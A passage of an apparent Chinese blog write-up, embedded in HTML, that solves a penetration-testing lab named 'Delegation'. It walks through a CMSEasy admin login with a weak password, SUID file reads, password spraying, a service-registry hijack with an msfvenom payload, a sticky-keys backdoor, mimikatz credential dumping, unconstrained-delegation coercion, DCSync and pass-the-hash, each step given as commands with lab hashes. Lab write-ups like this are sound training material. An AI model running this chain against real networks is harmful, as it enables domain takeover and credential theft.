+	
+		class="gallery-image" 
+		data-flex-grow="168"
+		data-flex-basis="405px"
+	
+></p>
+<h2 id="delegation">Delegation
+</h2><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313211643431.png"
+	width="1483"
+	height="762"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313211643431_hu11205717830044470010.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313211643431_hu16268356127460915449.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313211643431"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="467px"
+	
+></p>
+<p>访问是cmseasy,扫描目录可以得到<code>/admin</code>，是后台界面，弱口令admin/123456登入</p>
+<p>模板这里可以修改index.html,直接弹shell</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313212830336.png"
+	width="1859"
+	height="715"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313212830336_hu14965320796284260748.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313212830336_hu9211395074180442285.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313212830336"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="260"
+		data-flex-basis="624px"
+	
+></p>
+<p>连上之后是www-data权限要提权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313213136172.png"
+	width="837"
+	height="362"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313213136172_hu13516744949163812695.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313213136172_hu10705094586960412572.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313213136172"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="231"
+		data-flex-basis="554px"
+	
+></p>
+<p>GTFO找一下这个diff看看，diff可以任意文件读</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">diff --line-format<span class="o">=</span>%L /dev/null /home/flag/flag01.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313213517293.png"
+	width="883"
+	height="320"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313213517293_hu3726712197657149143.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313213517293_hu9680743635196633069.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313213517293"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="275"
+		data-flex-basis="662px"
+	
+></p>
+<p>uname -m查看到是32位，传fscan和stowaway</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313215031888.png"
+	width="904"
+	height="394"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313215031888_hu6914871970979617262.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313215031888_hu3397317991069250902.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313215031888"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="229"
+		data-flex-basis="550px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">172.22.4.7 DC01
+</span></span><span class="line"><span class="cl">172.22.4.19 FILESERVER
+</span></span><span class="line"><span class="cl">172.22.4.45 WIN19
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先内网穿透一下，前面的hint提示WIN19/Adrian和rockyou，说明要爆密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt -d WIN19
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后爆出来<code>babygirl1</code>,远程桌面连接提示密码已过期，所以还是用rdesktop</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 rdesktop 172.22.4.45 -r disk:share<span class="o">=</span>/tmp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>登进去之后桌面有一个PrivescCheck</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313222434611.png"
+	width="795"
+	height="601"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313222434611_hu10014629492005793465.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313222434611_hu14713371629644526422.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313222434611"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="132"
+		data-flex-basis="317px"
+	
+></p>
+<p>这里html存放扫描结果</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313222818906.png"
+	width="1687"
+	height="220"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313222818906_hu8180564304970135061.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313222818906_hu9350157109925670905.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313222818906"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="766"
+		data-flex-basis="1840px"
+	
+></p>
+<p>这里说是普通用户对注册表有写权限，也就是对修改路径为恶意程序来提权，这里用cs生成一个</p>
+<p>然后执行powershell命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Adrian</span><span class="p">\</span><span class="n">desktop</span><span class="p">&gt;</span> <span class="n">reg</span> <span class="n">add</span> <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">ImagePath</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_EXPAND_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&#34;C:\Users\Adrian\Desktop\beacon.exe&#34;</span> <span class="p">/</span><span class="n">f</span>
+</span></span><span class="line"><span class="cl"><span class="n">操作成功完成</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Adrian</span><span class="p">\</span><span class="n">desktop</span><span class="p">&gt;</span> <span class="n">reg</span> <span class="n">query</span> <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">ImagePath</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\</span><span class="n">gupdate</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ImagePath</span>    <span class="n">REG_EXPAND_SZ</span>    <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Adrian</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">artifact</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后启动gupdate服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&#34;sc start gupdate&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里非常奇怪连不上cs，换网上打法打粘滞键提权了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/x64/exec <span class="nv">cmd</span><span class="o">=</span><span class="s2">&#34;C:\windows\system32\cmd.exe /c C:\Users\Adrian\Desktop\shift.bat&#34;</span> --platform windows -f exe-service &gt; evil.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后新建shift.bat</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">REG ADD <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#34;</span> /v Debugger /t REG_SZ /d <span class="s2">&#34;C:\windows\system32\cmd.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后执行命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 修改注册表</span>
+</span></span><span class="line"><span class="cl">reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&#34;</span> /t REG_EXPAND_SZ /v ImagePath /d <span class="s2">&#34;C:\Users\Adrian\Desktop\evil.exe&#34;</span> /f
+</span></span><span class="line"><span class="cl"><span class="c1">## 重启服务</span>
+</span></span><span class="line"><span class="cl">sc start gupdate
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313230045295.png"
+	width="953"
+	height="269"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313230045295_hu16243910850540052386.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313230045295_hu12203992674286877965.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313230045295"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="354"
+		data-flex-basis="850px"
+	
+></p>
+<p>回到锁定界面，然后按五下shift，接下来创一个新用户，添加到管理员组再登入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net user 0d00 0d000721 /add
+</span></span><span class="line"><span class="cl">net localgroup administrators 0d00 /add
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313230536768.png"
+	width="847"
+	height="654"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313230536768_hu636725381878557927.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313230536768_hu5380980251485103247.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313230536768"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="129"
+		data-flex-basis="310px"
+	
+></p>
+<p>然后就是横向了，先获取域信息，上传mimikatz</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mimikatz.exe <span class="s2">&#34;&#34;</span>privilege::debug<span class="s2">&#34;&#34;</span> <span class="s2">&#34;&#34;</span>log sekurlsa::logonpasswords full<span class="s2">&#34;&#34;</span> <span class="nb">exit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">28018</span> <span class="o">(</span>00000000:00006d72<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">1</span>
+</span></span><span class="line"><span class="cl">User Name         : UMFD-1
+</span></span><span class="line"><span class="cl">Domain            : Font Driver Host
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/13 20:46:59
+</span></span><span class="line"><span class="cl">SID               : S-1-5-96-0-1
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 034d08b9bfcda6125f7f8604c6f9d7a7
+</span></span><span class="line"><span class="cl">         * SHA1     : 2d8d749e8f2da3ad77f6567ef0cf066aa93ca97b
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">         * Password : <span class="m">88</span> <span class="m">16</span> <span class="m">91</span> 2b ff <span class="m">34</span> <span class="m">91</span> 3e <span class="m">93</span> a3 2a <span class="m">91</span> <span class="m">75</span> e3 f4 6c <span class="m">63</span> cc <span class="m">36</span> 1a <span class="m">48</span> 1a 4b 2d 4f f1 <span class="m">24</span> <span class="m">30</span> df <span class="m">16</span> <span class="m">57</span> <span class="m">27</span> ec ae <span class="m">28</span> ac bc cf ff 0c 4f <span class="m">66</span> bd dd c4 af ad <span class="m">47</span> f9 <span class="m">48</span> 3f df b8 1d <span class="m">81</span> fa <span class="m">87</span> 2f 9c 9f <span class="m">83</span> bc <span class="m">51</span> b3 <span class="m">02</span> 8e <span class="m">95</span> <span class="m">37</span> a1 b8 7e <span class="m">86</span> 6b 5c <span class="m">15</span> 2b f8 <span class="m">34</span> d9 3d 3a <span class="m">29</span> ca f9 ec f7 <span class="m">55</span> ca <span class="m">61</span> 0f <span class="m">19</span> <span class="m">19</span> <span class="m">32</span> <span class="m">58</span> <span class="nb">cd</span> <span class="m">68</span> a2 dc f3 <span class="m">60</span> e8 <span class="m">80</span> <span class="m">54</span> <span class="m">81</span> <span class="m">11</span> e2 <span class="m">93</span> 6a <span class="m">62</span> d5 <span class="m">68</span> <span class="m">06</span> f6 <span class="m">46</span> 1e <span class="m">59</span> b7 <span class="m">13</span> fa cf a5 <span class="m">29</span> e6 <span class="m">50</span> bc <span class="m">48</span> ad 8f 4a <span class="m">62</span> 8e <span class="m">16</span> ea <span class="m">11</span> <span class="m">74</span> d3 0d <span class="m">27</span> <span class="m">51</span> <span class="m">00</span> a2 <span class="m">49</span> <span class="m">62</span> <span class="m">31</span> 8e 8b a0 fb <span class="m">53</span> d0 df <span class="m">48</span> <span class="m">65</span> 5d d6 <span class="nb">cd</span> ac <span class="m">20</span> 5a d3 aa <span class="m">56</span> 6a 8a <span class="m">82</span> <span class="m">47</span> <span class="m">00</span> 1a c0 <span class="m">56</span> <span class="m">37</span> 0d e5 1e c3 8b c7 8f c0 4c 1b <span class="m">24</span> <span class="m">43</span> bc <span class="m">47</span> <span class="m">61</span> <span class="m">77</span> da ff <span class="m">99</span> <span class="m">44</span> <span class="nb">cd</span> <span class="m">53</span> <span class="m">50</span> <span class="m">59</span> 3d 9a 5c <span class="m">11</span> ad <span class="m">01</span> 1e <span class="m">05</span> <span class="m">86</span> <span class="m">22</span> b0 aa <span class="m">40</span> ac bc 4a <span class="m">50</span> <span class="m">59</span> <span class="m">89</span> <span class="m">07</span> f2 <span class="m">95</span> <span class="nb">cd</span> <span class="m">42</span> <span class="m">79</span> <span class="m">49</span> <span class="m">31</span> fb <span class="m">91</span> <span class="m">47</span> ae <span class="m">56</span> f9 <span class="m">70</span> f9 <span class="m">51</span> d8 de <span class="m">72</span> 7b <span class="m">23</span> 2d <span class="m">23</span> a7 3e
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到WIN19$的ntlm<code>034d08b9bfcda6125f7f8604c6f9d7a7</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 -q python3 bloodhound.py -u <span class="s2">&#34;WIN19</span>$<span class="s2">&#34;</span> --hashes 034d08b9bfcda6125f7f8604c6f9d7a7:034d08b9bfcda6125f7f8604c6f9d7a7 -d xiaorang.lab -dc DC01.xiaorang.lab -c all --dns-tcp -ns 172.22.4.7 --auth-method ntlm --zip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>依旧拿这个bloodbound去分析域内信息</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313233547478.png"
+	width="1182"
+	height="564"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313233547478_hu5966557972197493392.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260313233547478_hu7169817867341848285.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313233547478"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="209"
+		data-flex-basis="502px"
+	
+></p>
+<p>WIN19 和 DC01 都存在非约束性委托，这里利用非约束性委派</p>
+<p>这里先利用Rubeus.exe监听TGT</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Rubeus.exe monitor /interval:1 /filteruser:DC01$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后用前面拿到的哈希触发DC01回连,这里的dfscoerce.py得去git下<a class="link" href="https://github.com/Wh04m1001/DFSCoerce"  target="_blank" rel="noopener"
+    >DFSCoerce</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 python3 dfscoerce.py -u <span class="s2">&#34;WIN19</span>$<span class="s2">&#34;</span> -hashes :034d08b9bfcda6125f7f8604c6f9d7a7 -d xiaorang.lab WIN19 172.22.4.7
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314000555317.png"
+	width="889"
+	height="483"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314000555317_hu7642027048966233307.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314000555317_hu13632730433687730048.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260314000555317"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="184"
+		data-flex-basis="441px"
+	
+></p>
+<p>把这一坨base64保存下来,然后给它解码保存成<code>DC.kirbi</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certutil -f -decode base64.txt DC.kirbi
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314001047934.png"
+	width="909"
+	height="585"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314001047934_hu16835302022965585574.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314001047934_hu1342217801433675430.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260314001047934"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="155"
+		data-flex-basis="372px"
+	
+></p>
+<p>然后使用mimikatz进行DCSync</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mimikatz.exe <span class="s2">&#34;kerberos::purge&#34;</span> <span class="s2">&#34;kerberos::ptt DC.kirbi&#34;</span> <span class="s2">&#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34;</span> <span class="s2">&#34;exit&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314001211908.png"
+	width="741"
+	height="408"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314001211908_hu10631976305573099688.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314001211908_hu1340798930228014615.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260314001211908"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="181"
+		data-flex-basis="435px"
+	
+></p>
+<p>拿到Administrator的hash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Administrator   4889f6553239ace1f7c47fa2c619c252
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最高权限拿下现在直接读fileserver的flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 crackmapexec smb 172.22.4.19 -u administrator -H4889f6553239ace1f7c47fa2c619c252 -d xiaorang.lab -x <span class="s2">&#34;type Users\Administrator\flag\flag03.txt&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314001640216.png"
+	width="1314"
+	height="465"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314001640216_hu7809514091873828886.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314001640216_hu12535776476216760013.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260314001640216"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="282"
+		data-flex-basis="678px"
+	
+></p>
+<p>拿域控flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 crackmapexec smb 172.22.4.7 -u administrator -H4889f6553239ace1f7c47fa2c619c252 -d xiaorang.lab -x <span class="s2">&#34;type Users\Administrator\flag\flag04.txt&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314001731546.png"
+	width="1314"
+	height="447"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314001731546_hu9833598295027458163.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260314001731546_hu12262460130938417735.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260314001731546"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="293"
+		data-flex-basis="705px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E6%89%93%E9%9D%B6/">打靶</a>
+        
+            <a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under 9u_l3</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
